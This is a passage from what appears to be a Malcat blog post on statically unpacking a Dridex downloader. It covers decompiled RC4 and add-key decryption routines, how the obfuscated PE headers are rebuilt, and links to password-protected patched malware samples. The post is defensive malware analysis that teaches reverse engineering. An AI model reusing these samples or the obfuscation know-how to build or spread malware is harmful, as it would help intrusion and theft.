<span class="w">        </span><span class="n">iStack52</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">iStack72</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100261e8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">iStack52</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iStack72</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100261a4</span><span class="p">);</span>
<span class="w">        </span><span class="n">iStack72</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iStack72</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">iStack72</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">    </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sub_100011c0</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="n">iStack52</span><span class="p">);</span><span class="w">  </span><span class="c1">// most likely a malloc</span>
<span class="w">    </span><span class="n">iStack60</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">iStack80</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">iVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iStack60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span>
<span class="w">        </span><span class="n">iVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100261e8</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100261a4</span><span class="p">);</span>
<span class="w">        </span><span class="n">sub_10013b50</span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">iStack80</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10026200</span><span class="p">),</span><span class="w"> </span><span class="n">iVar2</span><span class="p">);</span><span class="w">   </span><span class="c1">// function looks like memcpy(dst, src, size)</span>
<span class="w">        </span><span class="n">iStack80</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iVar2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">iStack80</span><span class="p">;</span>
<span class="w">        </span><span class="n">iStack60</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iStack60</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">iStack60</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">    </span><span class="n">sub_100136f0</span><span class="p">(</span><span class="n">iVar1</span><span class="p">,</span><span class="w"> </span><span class="n">iVar1</span><span class="p">,</span><span class="w"> </span><span class="n">iStack52</span><span class="p">);</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x2b7e</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x14</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1d400</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xc</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2600</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>I know that the abstract of this blog post promised very few reverse engineering, but it is time to plug in our brain for a few seconds and have a quick look at the decompiled code:</p>
<ul>
<li>the two loops each loops twice. Two is also the number of our buffers...</li>
<li><code>iStack52</code> in the first do-while loop is the sum of (<code>[0x100261e8]</code> - <code>[0x100261a4]</code>) = <code>0x10000</code> and (<code>[0x100261e8 + 100]</code> - <code>[0x100261a4 + 100]</code>) = <code>0x10000</code>, which could be the sizes of our two buffers</li>
<li><code>iVar1</code> seems to points to a buffer of size <code>iStack52</code></li>
<li><code>sub_10013b50</code>, once decompiled, looks like a simple memcpy</li>
<li>during the first loop turn of the second do-while, the memcpy call copies <code>[0x10026200]</code> (our buffer B reference, see above) to <code>iVar1</code>, <code>iVar2</code> seems to be the size of buffer B (0x10000)</li>
<li>during the second loop turn of the second do-while, the memcpy call copies <code>[0x10026200 + 100]</code> = <code>[0x10026264]</code> (which is actually our buffer A reference, see above) to <code>iVar1</code> + <code>0x10000</code></li>
</ul>
<p>So without reversing further, we can roughly infer that:</p>
<ul>
<li>buffer B and buffer A are actually both 0x10000 bytes big</li>
<li>our two buffers are concatenated into the iVar1 buffer (buffer B followed by buffer A)</li>
<li>function <code>sub_100136f0</code> gets called on the result</li>
</ul>
<p>So that wasn't too much complicated until now. Now let's have a look at <code>sub_100136f0</code>:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span>
<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">sub_100136f0</span><span class="p">(</span><span class="n">xunknown4</span><span class="w"> </span><span class="n">param_1</span><span class="p">,</span><span class="w"> </span><span class="n">xunknown4</span><span class="w"> </span><span class="n">param_2</span><span class="p">,</span><span class="w"> </span><span class="n">xunknown4</span><span class="w"> </span><span class="n">param_3</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">xunknown4</span><span class="w"> </span><span class="n">xVar1</span><span class="p">;</span>
<span class="w">    </span><span class="n">xunknown1</span><span class="w"> </span><span class="n">axStack272</span><span class="w"> </span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="n">xVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3b</span><span class="p">;</span>
<span class="w">    </span><span class="n">sub_10012d50</span><span class="p">(</span><span class="n">axStack272</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10015161</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3b</span><span class="p">);</span>
<span class="w">    </span><span class="n">sub_10013ca0</span><span class="p">(</span><span class="n">axStack272</span><span class="p">,</span><span class="w"> </span><span class="n">param_1</span><span class="p">,</span><span class="w"> </span><span class="n">param_2</span><span class="p">,</span><span class="w"> </span><span class="n">param_3</span><span class="p">,</span><span class="w"> </span><span class="n">xVar1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>Looks like this function calls two sub-functions which both use a 256 bytes buffer internally (<code>axStack272</code>). The first function <code>sub_10012d50</code> takes as parameters the 256 bytes buffer, a pointer to some high-entropy data (at <code>0x10015161</code>) and the integer 0x3b. If we looks at the decompiled code of <code>sub_10012d50</code>, it should ring some bells for malware analysts:</p>
<figure id="format4"><img alt="decompiled code of sub_10012d50" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/rc4.png"/><figcaption>Figure 4: decompiled code of sub_10012d50</figcaption></figure>
<p>We see indeed a first loop which initialises a 256 bytes buffer with values from 0 to 255, and a second loop which permutes some of the cells of the buffer. It looks <em>a lot</em> like a RC4 initialisation function. So instead of reversing further, we will first verify if our hypothesis holds. We will append 0x20000 bytes to the end of the file, concatenate buffer B and buffer A in this overlay and try to decrypt the two buffers using Malcat's RC4 transform and the 0x3b bytes key at <code>0x10015161</code> (small tip: first open a copy of the program with 0x20000 additional bytes at the end of the file to make room for the concatenated buffers):</p>
<figure id="format5"><img alt="concatenating and decrypting the two buffers" class="gif" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/decode.gif"/><figcaption>Figure 5: concatenating and decrypting the two buffers</figcaption></figure>
<p>It works! Well, kind of at least. This definitely looks like a PE file, but parts of the MZ and PE headers are still encrypted. This is a common anti-dump trick used to confuse signature-based memory dumpers. The first 32 bytes of the result (all set to zero) also seems useless, which would explain the line <code>*(param_1 + 4) = iVar1 + 0x20;</code> in function <code>sub_10013940</code>.</p>
<h2 id="reconstructing-the-headers">Reconstructing the headers</h2>
<p>Obviously, some other function in the program is responsible for fixing the MZ and PE headers of the decrypted buffer. So, we should navigate through the obfuscated code and locate it right? But since the PE header seems to be only <em>partially</em> encrypted (the string <code>"This program cannot be run in DOS mode"</code> is still visible as well as section names), we could try to be smarter and save some time. Let us diff the decrypted buffer with another valid PE, for instance the first layer (chances are they have been generated using the same compiler, which makes the job easier). </p>
<p>To do this, first dump the decrypted buffer (minus the first 32 bytes which are all zero) into a file. Let's call it <code>layer2_original.bin</code>. Then, select both the first layer (<code>file8.bin</code>) and the buffer (<code>layer2_original.bin</code>) inside your explorer and drag them into Malcat in order to diff them. You can switch between the hex view and the structure view (<strong>F2</strong>) to see which MZ/PE fields have been encrypted. You should see something like this (minus the comments ofc):</p>
<figure id="format6"><img alt="Left: first layer (aka our reference program), right: decrypted buffer with obfuscated bytes" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/diff1.png"/><figcaption>Figure 6: Left: first layer (aka our reference program), right: decrypted buffer with obfuscated bytes</figcaption></figure>
<p>As we can see on the picture, only a few spots in the headers of the decrypted buffer seem to have been encrypted:</p>
<ul>
<li>The first 6 bytes of the MZ header: <code>[#0-#6[</code></li>
<li>The last field of the MZ header, AddressOfPEHeader: <code>[#3c-#40[</code></li>
<li>The rich headers are different, but we can safely ignore them</li>
<li>The first 6 bytes of the PE header: <code>[#c8-cd[</code></li>
<li>End of PE header + start of OptionalHeader, also 6 bytes: <code>[#dc-#e2[</code></li>
<li>Export director entry in the data directory, also 6 bytes: <code>[#140-#146[</code></li>
</ul>
<p>The rest of the differences are all somehow making sense, we are diffing different programs after all. So we will start patching back the obfuscated bytes using our reference program:</p>
<ul>
<li>We will copy the first 6 bytes from <code>file8.bin</code> to <code>layer2.bin</code></li>
<li>We will patch the AddressOfPEHeader field with the value <code>0xc8</code> (since the rich header is 8 bytes less than in <code>file8.bin</code>)</li>
<li>We will copy the first 6 bytes of the PE header from <code>file8.bin</code> <code>[#d0-#d6[</code> to <code>layer2.bin</code> <code>[#c8-#cd[</code></li>
<li>We will copy end of PE header + start of OptionalHeader from <code>file8.bin</code> <code>[#e4-#ea[</code> to <code>layer2.bin</code> <code>[#dc-#e2[</code></li>
</ul>
<p>We can safely ignore the obfuscated export directory. Once the patching is done, hit <strong>Ctrl+R</strong> to reanalyze the patched file and Malcat should now recognize it as a PE file. The headers should then look like in the picture below. For the lazy readers, you can download the patched file <a href="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/layer2.zip">here</a> (password: infected).</p>
<figure id="format7"><img alt="Decrypted buffer after patching back the headers" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/patched.png"/><figcaption>Figure 7: Decrypted buffer after patching back the headers</figcaption></figure>
<h1 id="the-second-stage">The second stage</h1>
<h2 id="locating-the-payload-and-the-decryption-function">Locating the payload and the decryption function</h2>
<p>The second layer comes as a tiny PE file with a huge high-entropy overlay. At this stage, since we did not analyse most of the code of the first stage program, it is not clear how the second layer is run. It is possible that the overlay would have been put inside an allocated memory region before running the second stage. But it definitely looks encrypted and thus pretty <em>interesting</em>.</p>
<figure id="format8"><img alt="32 bytes long repeats inside the encrypted payload of second stage" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/key.png"/><figcaption>Figure 8: 32 bytes long repeats inside the encrypted payload of second stage</figcaption></figure>
<p>Since the payload is in the overlay (or inside an allocated memory buffer), we can't just look for cross-references like we did in the first stage. We could look for the decryption function inside the .code section, but sadly the code is also obfuscated. Fortunately, by looking at the encrypted data, we can see some 32 bytes long pattern which get repeated a few times. This means two things:</p>
<ul>
<li>The payload has been encrypted using a 32 bytes key</li>
<li>The cipher algorithm is most likely a stream cipher, and a pretty simple one</li>
</ul>
<p>So instead of looking for references or code, let us look for a 32-bytes long key, i.e a referenced, high-entropy, 32 bytes long, data block. The second stage is quite small, and there is only one data block in the .rdata section which fits this description: <code>[0x40304e-0x40306d[</code>. The key candidate is referenced by a pointer at address <code>0x404018</code>, which is itself referenced by the very similar functions <code>sub_401301</code> and <code>sub_401549</code>. Let us have a look at the first one:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">xunknown4</span><span class="w"> </span><span class="nf">sub_401301</span><span class="p">(</span><span class="n">int4</span><span class="w"> </span><span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span>
<span class="w">    </span><span class="n">uint4</span><span class="w"> </span><span class="n">uVar2</span><span class="p">;</span>
<span class="w">    </span><span class="n">uint4</span><span class="w"> </span><span class="n">uVar3</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iStack32</span><span class="p">;</span>
<span class="w">    </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x54</span><span class="p">);</span><span class="w">  </span><span class="c1">// data pointer</span>
<span class="w">    </span><span class="n">uVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20</span><span class="p">);</span><span class="w">  </span><span class="c1">// data size</span>
<span class="w">    </span><span class="n">iStack32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">uVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iStack32</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40401c</span><span class="p">);</span><span class="w">     </span><span class="c1">// randomized starting index</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">uVar3</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">uVar2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">*</span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">uVar3</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">uVar3</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="p">([</span><span class="mh">0x00404018</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">uVar3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x1f</span><span class="p">))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0xff</span><span class="p">);</span><span class="w"> </span><span class="c1">// 0x00404018 is a pointer to our key candidate</span>
<span class="w">            </span><span class="n">uVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xff</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">iStack32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iStack32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">iStack32</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0xff</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>This definitely looks like a decryption function, with a key of size 32 (see the <code>uVar3 &amp; 0x1f</code> ?). </p>
<h2 id="decoding-the-overlay">Decoding the overlay</h2>
<p>The buffer seems to be decrypted by ADDing the key bytes XOR <code>0xff</code> (aka performing a NOT on the key bytes and then adding the key bytes to the buffer). </p>
<p>There seem to be a twist though. At address <code>0x40401c</code> we can find an array of 255 dwords, which is a random permutation of the <code>[0 .. 254]</code> interval. This array seems to be used as starting index (<code>uVar3</code>) to decrypt every 255th byte of the buffer. Why would they do that? I don't know, it does not look like obfuscation. It is most likely an anti-dump technique, since some dumpers detect decryption function by looking for sequential writes. This makes sure that the decryption output stream is not written sequentially indeed.</p>
<p>Anyway, we can safely ignore this part of the code since the order of write is irrelevant to us. Let us try to decrypt the buffer using Malcat's transforms. We will first NOT the key, and use the result as key for the <code>add8</code> algorithm (which is just a add using a repeated key):</p>
<figure id="format9"><img alt="decoding the overlay using key at 0x40304e" class="gif" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/decode2.gif"/><figcaption>Figure 9: decoding the overlay using key at 0x40304e</figcaption></figure>
<p>And it works, we get a 119808 bytes PE file! But again, parts of the MZ and PE headers seem to be obfuscated :( We won't go through the header reconstruction again, it is the exact same process as for the first stage. Just be careful this time, the Rich header being bigger, the PE header starts at offset <code>0xe8</code>. You can download the patched file <a href="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/layer3.zip">here</a> (password: infected).</p>
<p>The resulting PE is only slightly obfuscated this time. A quick look at <a href="https://www.virustotal.com/gui/file-analysis/NGMwNzc4NzBlN2QyZWRhNzk0MjA0MDYyOWM1NzI2OTk6MTYzMTE3NTQzNA==">Virustotal</a> tells us that this is a Dridex sample. And this time we can be pretty sure that this is the final stage:</p>
<ul>
<li>code is less obfuscated (only some constant obfuscation, and strings seem to be encrypted too)</li>
<li>there is way more code than data, which would be weird for a dropper/injector</li>
<li>we can see some plain-text constants which make little sense for a dropper, like the ITaskService GUID at address <code>0x41c960</code></li>
</ul>
<p>This is not the main Dridex component though, but the Dridex <em>downloader</em>, since Dridex is a complex multi-stage malware. Decrypting the strings and configuration may be the subject of another article.</p>
<h1 id="conclusion">Conclusion</h1>
<p>We have seen how to navigate inside an Excel document, its sheets and its macros and how to statically extract its payload using Malcat. We also have seen how to circumvent native code obfuscation by ignoring the code and focusing on the data (and using a bit of guessing).</p>
<p>Static unpacking is not reserved to simple malware and can also be used for modern complex families like this Dridex dropper. By focusing on the data instead of the code, we were able to go through the different stages of the dropper with ease and could completely ignore the obfuscation layers.</p>
<p>I hope that you enjoyed this rapid unpacking session. As usual, feel free to share with us your remarks or suggestions!</p>
</div>
</article>
</section>
<footer class="footer text-center py-4">
<small class="copyright">Copyright Â© <a href="https://malcat.fr" target="_blank">MALCAT</a></small><small class="copyright" style="margin-left:4em">View our <a href="https://malcat.fr/privacypolicy.html" target="_blank">privacy policy</a></small>
<div class="text-center w-100">
<ul class="social-list list-inline py-2 mx-auto">
<li class="list-inline-item"><a href="https://malcat.fr/rss.xml"><i class="fas fa-rss fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://twitter.com/malcat4ever"><i class="fab fa-twitter fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://discord.gg/Pf3s2ZKqtU"><i class="fab fa-discord fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://www.linkedin.com/company/malcat"><i class="fab fa-linkedin fa-fw"></i></a></li>
</ul><!--//social-list-->
</div><!--//dark-mode-toggle-->
</footer>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<script language="javascript">
tocbot.init({
  // Where to render the table of contents.
  tocSelector: '.js-toc',
  // Where to grab the headings to build the table of contents.
  contentSelector: '.js-toc-content',
  // Which headings to grab inside of the contentSelector element.
  headingSelector: 'h1, h2, h3',
  // For headings inside relative or absolute positioned containers within content.
  hasInnerContainers: true,
  collapseDepth: 4,
});
</script>
</body>
</html>
